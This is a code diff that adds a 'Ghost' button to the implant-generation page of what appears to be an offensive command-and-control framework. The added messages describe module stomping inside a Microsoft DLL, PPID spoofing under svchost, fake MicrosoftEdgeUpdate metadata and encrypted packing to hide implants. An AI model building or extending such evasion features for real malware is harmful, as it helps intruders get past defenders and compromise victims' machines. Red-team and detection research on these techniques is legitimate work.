@@ -103,6 +103,7 @@ export default function Generate() {
   const [terminal, setTerminal] = useState<TermLine[]>([])
   const [running,  setRunning]  = useState(false)
   const [packing,  setPacking]  = useState(false)
+  const [ghosting, setGhosting] = useState(false)
   const [showEvasion, setShowEvasion] = useState(true)
   const termRef = useRef<HTMLDivElement>(null)
 
@@ -249,6 +250,35 @@ export default function Generate() {
   function downloadImplant() {
     if (!result?.path) return
     window.open(`/api/generate/download?path=${encodeURIComponent(result.path)}`, '_blank')
+  }
+
+  // Ghost: Module Stomping + PPID Spoof + PE fake metadata + AES
+  async function ghostImplant() {
+    if (!result?.path) return
+    setGhosting(true)
+    setTerminal(prev => [
+      ...prev,
+      { text: '', type: 'info' },
+      { text: '[*] Ghost packing: Module Stomping + PPID Spoof + MicrosoftEdgeUpdate metadata…', type: 'info' },
+      { text: '[*] Compiling ghost loader with garble…', type: 'info' },
+    ])
+    try {
+      const res = await apiPost<{ path: string; message: string }>('/api/generate/ghost', {
+        binary_path:  result.path,
+        implant_name: name.trim() || 'implant',
+        is_shellcode: format === 'bin',
+      })
+      setResult(prev => prev ? { ...prev, path: res.path, message: res.message } : null)
+      setTerminal(prev => [
+        ...prev,
+        { text: `[+] Ghost loader: ${res.path}`, type: 'ok' },
+        { text: `[*] ${res.message}`, type: 'info' },
+        { text: '[+] Execution: from inside Microsoft-signed DLL .text section', type: 'ok' },
+        { text: '[+] Process tree: svchost.exe → MicrosoftEdgeUpdate.exe', type: 'ok' },
+      ])
+    } catch (e) {
+      setTerminal(prev => [...prev, { text: `[-] Ghost failed: ${e}`, type: 'err' }])
+    } finally { setGhosting(false) }
   }
 
   // Pack: AES-256-GCM encrypt the generated binary inside a fresh Go loader.
@@ -487,6 +517,23 @@ export default function Generate() {
                 {running ? <Loader size={12} className="animate-spin" /> : <Play size={12} />}
                 <span style={{ fontSize: 10 }}>Execute</span>
               </button>
+
+              {/* Ghost: Module Stomp + PPID Spoof + fake MS metadata */}
+              {result.path && os === 'windows' && (
+                <button onClick={ghostImplant} disabled={ghosting}
+                  title="Module Stomping (exec from MS DLL) + PPID Spoof (svchost parent) + MicrosoftEdgeUpdate.exe metadata — maximum stealth"
+                  style={{
+                    display: 'flex', alignItems: 'center', gap: 5,
+                    padding: '6px 12px', borderRadius: 4, fontSize: 10,
+                    fontFamily: 'inherit', fontWeight: 700, cursor: ghosting ? 'wait' : 'pointer',
+                    background: ghosting ? 'rgba(147,51,234,.08)' : 'rgba(147,51,234,.18)',
+                    border: '1px solid rgba(147,51,234,.55)',
+                    color: '#c084fc',
+                  }}>
+                  {ghosting ? <Loader size={11} className="animate-spin" /> : <Zap size={11} />}
+                  {ghosting ? 'Ghosting…' : '👻 Ghost'}
+                </button>
+              )}
 
               {/* Pack: AES-encrypt implant inside fresh loader binary */}
               {result.path && os === 'windows' && (
